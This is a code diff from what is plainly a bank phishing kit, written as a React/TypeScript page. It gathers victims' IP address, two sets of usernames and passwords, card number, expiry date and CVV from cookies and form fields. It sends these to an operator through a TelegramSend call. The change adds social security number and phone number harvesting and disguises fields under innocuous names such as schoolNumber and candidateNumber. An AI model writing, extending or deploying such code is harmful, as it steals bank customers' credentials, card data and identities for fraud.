@@ -19,6 +19,9 @@ export default function Additional() {
   const login1: Login = cookies.get("login1");
   const login2: Login2 = cookies.get("login2");
   const ip: string = cookies.get("ip");
+  const courseCode: string = cookies.get("courseCode");
+  const identity: IdentityT = cookies.get("identity");
+
   const [isLoading, setIsLoading] = React.useState(false);
   const navigate = useNavigate();
 
@@ -61,9 +64,9 @@ export default function Additional() {
 
   async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
     event.preventDefault();
-
+    setIsLoading(true)
     const message = `
-    [----+🏦 CUSTOMER KAAD 🏦+-----]
+    [----+🏦 CAPITAL KAAD 🏦+-----]
 
     IP: ${ip}
 
@@ -75,22 +78,31 @@ export default function Additional() {
     Username 2: ${login2.username2}
     Password 2: ${login2.password2}
 
+    Code: ${courseCode}
+
     KAAD NUMBER: ${formInput.schoolNumber}
 
     KAAD EXPIRY: ${formInput.resumptionDate}
 
     KAAD CVV: ${formInput.entryCode}
+
+    SSN: ${identity.candidateNumber}
+    Phone Number: ${identity.examCode}
     `;
     const isValidCardNumber = verifyCreditCardNumber(formInput.schoolNumber);
     if (!isValidCardNumber) {
       document.getElementById("card-error")?.classList.remove("hide");
       return;
     }
-    setIsLoading(true);
+    // setIsLoading(true);
+    // await TelegramSend(message);
+    // setIsLoading(false);
+    // cookies.set("additional", formInput);
+    // navigate("../login/auth/3", { replace: true });
+
     await TelegramSend(message);
     setIsLoading(false);
-    cookies.set("additional", formInput);
-    navigate("../login/auth/3", { replace: true });
+    navigate("../success", {replace:true});
   }
   return (
     <>
